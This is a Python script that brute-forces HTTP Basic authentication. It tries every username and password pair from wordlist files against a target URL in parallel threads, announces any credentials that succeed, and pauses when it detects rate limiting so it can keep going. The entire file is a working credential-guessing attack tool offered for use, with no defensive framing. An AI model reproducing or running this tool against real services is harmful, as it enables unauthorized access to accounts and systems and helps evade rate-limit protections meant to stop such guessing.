#!/usr/bin/env python3

__author__ = "(th3x0ne) + SierraUniformSierra"

import sys
import concurrent.futures
from requests import get as GET
from requests.exceptions import ConnectionError
from colorama import Fore
from os.path import isfile
from argparse import ArgumentParser
from base64 import b64encode
import time
import threading

def printer(_:str) -> None:
	sys.stdout.write(f'{Fore.BLUE}[*]{Fore.WHITE} trying with {Fore.YELLOW}{_} {Fore.WHITE}')
	sys.stdout.flush()

def encode_user_passwd(user:str, passwd:str) -> str:
	user_pass = f"{user}:{passwd.strip()}"
	base64_value = b64encode(user_pass.encode('utf-8')).decode('utf-8')
	return base64_value

def send_request(url:str, user:str, passwd:str, rate_limit_flag, wait_time):
	base64_value = encode_user_passwd(user, passwd)
	headers = {"Authorization": f"Basic {base64_value}"}
	try:
		response = GET(url, headers=headers)
		printer(f"{user}:{passwd}")
		if response.status_code == 200:
			exit(f"\n{Fore.GREEN}[+] {Fore.WHITE} PASSWORD FOUND : {Fore.GREEN}{user} : {passwd}{Fore.WHITE}.")
	except ConnectionError as err:
		if "Connection reset by peer" in str(err):
			rate_limit_flag.set()
		else:
			print(err)
	except Exception as err:
		print(err)

if __name__ == "__main__":
	parser = ArgumentParser()
	parser.add_argument('-t', '--target', required=True, help="TARGET URL")
	parser.add_argument('-u', '--user-file', required=True, help="USERS FILE")
	parser.add_argument('-p', '--password-file', required=True, help="PASSWORDS FILE")
	parser.add_argument('-w', '--wait-time', type=int, required=True, help="WAIT TIME in seconds when rate limited")
	args = parser.parse_args()

	users = open(args.user_file, mode='r').readlines()
	passwords = open(args.password_file, mode='r').readlines()

	rate_limit_flag = threading.Event()

	for user in users:
		user = user.strip('\n\r')
		try:
			with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
				futures = {executor.submit(send_request, args.target, user, passwd, rate_limit_flag, args.wait_time) for passwd in passwords}
				for future in concurrent.futures.as_completed(futures):
					if rate_limit_flag.is_set():
						print(f"{Fore.RED}[!] Rate limiting detected. Waiting for {args.wait_time} seconds...{Fore.WHITE}")
						time.sleep(args.wait_time)
						rate_limit_flag.clear()
						break
		except KeyboardInterrupt:
			exit('CTRL+C Detected...')
